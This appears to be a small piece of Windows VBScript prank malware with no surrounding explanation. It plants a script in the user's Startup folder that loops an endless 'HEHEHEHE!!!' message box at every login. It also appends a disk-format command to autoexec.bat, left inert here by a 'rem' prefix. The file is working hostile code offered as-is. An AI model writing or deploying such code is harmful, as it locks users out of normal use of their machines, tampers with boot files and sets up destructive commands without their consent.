' Set WSHShell = WScript.CreateObject("WScript.Shell")
' Set WSHFileSys = WScript.CreateObject("Scripting.FileSystemObject")
' WSHShell.SpecialFolders("Startup")

Set WSHShell = WScript.CreateObject("WScript.Shell")
startup = WSHShell.SpecialFolders("Startup")
Set WSHFileSys = WScript.CreateObject("Scripting.FileSystemObject")
Randomize Timer
' if rnd < 0.9  then
Set heha = WSHFileSys.CreateTextFile(startup + "\hehe.vbs", true)
heha.WriteLine("while 1=1")
heha.WriteLine("msgbox("+chr(34)+"HEHEHEHE!!!"+chr(34)+")")
heha.WriteLine("wend")
heha.close
Set hahaha = WSHFileSys.OpenTextFile("c:\autoexec.bat", 8, True)
hahaha.WriteBlankLines(2)
hahaha.WriteLine("rem format c:\ /q")
' end if